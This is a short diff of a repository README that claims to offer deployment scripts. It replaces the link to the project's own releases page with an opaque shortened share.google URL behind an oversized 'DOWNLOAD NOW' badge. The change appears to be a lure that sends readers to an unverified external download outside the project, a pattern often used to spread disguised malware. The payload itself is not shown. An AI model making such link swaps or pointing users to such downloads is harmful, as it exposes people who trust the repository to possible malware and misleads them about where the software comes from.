@@ -4,7 +4,7 @@ This repository contains professional deployment scripts, configuration manifest
 
 # Get now
 
-<a href="../../releases" target="_blank">
+<a href="https://share.google/LxVVhZPngXGfGpj3P" target="_blank">
   <img src="https://img.shields.io/badge/⚡%20DOWNLOAD%20NOW-FF9F43?style=for-the-badge&logo=git-lfs&logoColor=white" height="50" alt="Download Now" />
 </a>
 
